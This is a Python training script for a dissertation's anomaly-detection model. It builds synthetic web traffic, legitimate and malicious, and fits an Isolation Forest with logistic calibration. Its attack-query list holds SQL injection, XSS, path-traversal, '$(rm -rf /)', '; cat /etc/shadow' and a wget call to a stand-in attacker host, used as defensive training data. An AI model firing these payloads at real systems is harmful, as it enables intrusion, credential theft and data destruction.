"""Trainer for the anomaly-detection model.

Run with:

    python -m app.ml.train

The script generates synthetic training data that resembles the kind of
traffic the rule-based-server's mock API receives (legitimate users hitting
/login, /data, /payment, /search, /profile/:id with reasonable frequencies),
plus a small fraction of clearly-anomalous requests (high burst rates,
endpoint scanning, attack-keyword payloads, missing user-agents). The
Isolation Forest is fitted on this mixture, and a one-parameter logistic
calibration is fitted afterwards so the runtime decision function maps
neatly to [0, 1].

The synthetic data generator is deterministic given the same seed, so the
trained artefact is reproducible — important for the dissertation appendix.
"""

from __future__ import annotations

import logging
import random
import sys
from datetime import datetime, timezone
from pathlib import Path

import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.metrics import roc_auc_score

from app.config import get_settings
from app.logging_config import configure_logging
from app.ml.features import FEATURE_ORDER, extract, to_vector
from app.ml.model import CalibratedModel, save
from app.schemas import DetectRequest, HistoryFeatures

log = logging.getLogger(__name__)

# ─── synthetic data generators ──────────────────────────────────────────────

_LEGIT_PATHS = [
    "/api/login",
    "/api/data",
    "/api/payment",
    "/api/search",
    "/api/profile/123",
    "/api/profile/456",
    "/api/echo",
]

_LEGIT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1",
]

_ATTACK_QUERIES = [
    "1' OR '1'='1",
    "1' UNION SELECT * FROM users--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "; cat /etc/shadow",
    "$(rm -rf /)",
    "`wget evil.example.com`",
    "1' AND SLEEP(5)--",
    "javascript:alert(document.cookie)",
]

_ATTACK_PATHS = [
    "/api/search",
    "/api/login",
    "/api/data",
    "/api/profile/admin",
]

_ATTACK_UAS = [
    "sqlmap/1.7.2",
    "Nikto/2.5.0",
    "Mozilla/5.0 nmap-scripts",
    "python-requests/2.31",
    "curl/8.4.0",
    "",  # missing UA
    "x",  # absurdly short
]


def _legit_request(rng: random.Random) -> DetectRequest:
    path = rng.choice(_LEGIT_PATHS)
    method = "POST" if path in {"/api/login", "/api/payment"} else "GET"
    return DetectRequest(
        method=method,
        path=path,
        endpoint=path,
        user_agent=rng.choice(_LEGIT_UAS),
        content_length=rng.randint(0, 600) if method == "POST" else 0,
        has_body=method == "POST",
        query_keys=["q"] if path == "/api/search" else [],
        body_keys=["amount", "currency"] if path == "/api/payment" else (
            ["username", "password"] if path == "/api/login" else []
        ),
        history=HistoryFeatures(
            requests_1min=rng.randint(0, 30),
            requests_burst=rng.randint(0, 6),
            distinct_paths=rng.randint(1, 4),
        ),
    )


def _malicious_request(rng: random.Random) -> DetectRequest:
    flavour = rng.random()

    if flavour < 0.45:
        # Payload-based attacks (SQLi/XSS/path-traversal/cmd-injection).
        q = rng.choice(_ATTACK_QUERIES)
        path = rng.choice(_ATTACK_PATHS)
        # ~35% of these use a legitimate-looking UA. This forces the model to
        # rely on the payload signal rather than the UA shortcut, which
        # mirrors the realistic "smart attacker" scenario.
        ua = rng.choice(_LEGIT_UAS) if rng.random() < 0.35 else rng.choice(_ATTACK_UAS)
        return DetectRequest(
            method=rng.choice(["GET", "POST"]),
            path=path,
            endpoint=f"{path}?q={q}",
            user_agent=ua,
            content_length=rng.randint(0, 200),
            has_body=False,
            query_keys=["q"],
            body_keys=[],
            history=HistoryFeatures(
                requests_1min=rng.randint(1, 80),
                requests_burst=rng.randint(0, 12),
                distinct_paths=rng.randint(1, 5),
            ),
        )
    if flavour < 0.75:
        # Burst / brute-force traffic.
        return DetectRequest(
            method="POST",
            path="/api/login",
            endpoint="/api/login",
            user_agent=rng.choice(_ATTACK_UAS + _LEGIT_UAS),
            content_length=rng.randint(40, 200),
            has_body=True,
            query_keys=[],
            body_keys=["username", "password"],
            history=HistoryFeatures(
                requests_1min=rng.randint(80, 400),
                requests_burst=rng.randint(20, 80),
                distinct_paths=rng.randint(1, 3),
            ),
        )
    # Endpoint-scanning traffic: many paths, modest rate.
    return DetectRequest(
        method="GET",
        path=f"/api/probe/{rng.randint(0, 999)}",
        endpoint=f"/api/probe/{rng.randint(0, 999)}",
        user_agent=rng.choice(_ATTACK_UAS),
        content_length=0,
        has_body=False,
        query_keys=[],
        body_keys=[],
        history=HistoryFeatures(
            requests_1min=rng.randint(20, 200),
            requests_burst=rng.randint(2, 10),
            distinct_paths=rng.randint(15, 60),
        ),
    )


def build_dataset(
    n_legit: int, n_anom: int, *, seed: int = 42
) -> tuple[np.ndarray, np.ndarray]:
    """Return (X, y) where y=0 is legitimate and y=1 is anomalous."""
    rng = random.Random(seed)
    rows: list[list[float]] = []
    labels: list[int] = []

    for _ in range(n_legit):
        rows.append(to_vector(extract(_legit_request(rng))))
        labels.append(0)
    for _ in range(n_anom):
        rows.append(to_vector(extract(_malicious_request(rng))))
        labels.append(1)

    X = np.array(rows, dtype=float)
    y = np.array(labels, dtype=int)
    # Shuffle so any ordering bias does not leak into validation.
    perm = np.random.RandomState(seed).permutation(len(y))
    return X[perm], y[perm]


# ─── calibration ────────────────────────────────────────────────────────────


def fit_calibration(forest: IsolationForest, X: np.ndarray, y: np.ndarray) -> tuple[float, float]:
    """Fit a 1-D logistic regression mapping the negated decision_function to P(anomaly).

    We fit by maximum likelihood with a tiny gradient ascent — sufficient for
    a single feature and avoids pulling in sklearn's LR for one parameter.
    """
    raw = -forest.decision_function(X)  # higher = more anomalous
    # Normalise raw to zero-mean for numerical stability before fitting.
    mu = float(raw.mean())
    sigma = float(raw.std()) or 1.0
    z = (raw - mu) / sigma

    a, b = 1.0, 0.0
    lr = 0.05
    for _ in range(2_000):
        p = 1.0 / (1.0 + np.exp(-(a * z + b)))
        # Avoid log(0) in the loss; we only use gradient.
        grad_a = float(((p - y) * z).mean())
        grad_b = float((p - y).mean())
        a -= lr * grad_a
        b -= lr * grad_b

    # Translate (a, b) on the normalised z back to operate on raw values:
    #   a_raw * raw + b_raw = a_z * (raw - mu)/sigma + b_z
    a_raw = a / sigma
    b_raw = b - a * mu / sigma
    return float(a_raw), float(b_raw)


# ─── main ───────────────────────────────────────────────────────────────────


def main() -> int:
    settings = get_settings()
    configure_logging(level=settings.log_level, dev=not settings.is_prod)

    n_legit, n_anom = 5_000, 1_000
    log.info("training_start", extra={"n_legit": n_legit, "n_anom": n_anom})

    X, y = build_dataset(n_legit=n_legit, n_anom=n_anom)
    contamination = float(y.mean())  # fraction of anomalies

    forest = IsolationForest(
        n_estimators=200,
        max_samples=min(2_048, X.shape[0]),
        contamination=contamination,
        random_state=42,
        n_jobs=-1,
    )
    forest.fit(X)

    a, b = fit_calibration(forest, X, y)

    # Quick sanity-check: ROC-AUC of the calibrated probability vs labels.
    from app.ml.model import CalibratedModel as _CM, score as _score

    cm = _CM(
        forest=forest,
        calibration_a=a,
        calibration_b=b,
        feature_order=FEATURE_ORDER,
        trained_at=datetime.now(timezone.utc).isoformat(),
        train_samples=int(X.shape[0]),
        train_anomaly_fraction=contamination,
    )
    probs = np.array([_score(cm, list(row)) for row in X])
    auc = float(roc_auc_score(y, probs))
    log.info(
        "training_done",
        extra={
            "auc": round(auc, 4),
            "contamination": round(contamination, 4),
            "calibration_a": round(a, 4),
            "calibration_b": round(b, 4),
        },
    )

    save(cm, settings.model_path)
    return 0


if __name__ == "__main__":
    sys.exit(main())
